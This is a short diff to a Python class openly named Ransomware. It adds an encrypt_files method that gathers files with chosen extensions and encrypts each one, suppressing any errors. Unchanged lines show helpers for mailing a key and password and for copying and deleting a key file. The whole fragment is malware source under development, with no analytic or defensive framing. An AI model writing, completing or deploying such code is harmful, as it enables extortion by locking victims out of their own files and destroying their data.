@@ -84,7 +84,7 @@ class Ransomware:
         except:
             self.handle_mail(key, passwd)
 
-    
+
     def create_copy_of_key(self, key, dir_to):
         dir_to = sys._MEIPASS
 
@@ -100,6 +100,16 @@ class Ransomware:
     def remove_copy_of_key(self, dir):
         path = normalize_path_name(dir, 'sys_config.txt')
         os.remove(path)
+
+    def encrypt_files(self, key):
+        all_files = self.file_generator(self.starting_dir_test, self.interesting_extensions)
+
+        for f in all_files:
+            try:
+                modules.cryptography.encrypt(key, f)
+            except:
+                pass
+
 
 if __name__ == '__main__':
     pass
